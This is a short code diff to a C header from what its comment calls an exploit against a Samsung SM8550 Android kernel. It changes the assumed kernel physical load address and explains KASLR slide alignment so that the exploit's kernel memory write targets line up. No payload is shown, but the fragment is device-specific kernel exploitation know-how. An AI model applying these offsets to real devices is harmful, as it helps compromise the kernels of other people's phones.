@@ -31,8 +31,10 @@
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
-/* SM8550 (same SoC as dm3q); ABL load address, exploit self-checks guard this */
-#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
+/* Samsung 5.x KASLR pattern (cf. A53 A536E PR#168): kernel_phys = PHYS_OFFSET + slide,
+ * slide 32K-aligned up to 0x3f00000. The 6.1-era +0x80000 delta (dm3q/e3q) mismatches
+ * our measured slides (0x38000/0x108000 < 0x80000) and shifts every P0 write target. */
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 #define SKB_DATA_DELTA (-0x1000LL)
 
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
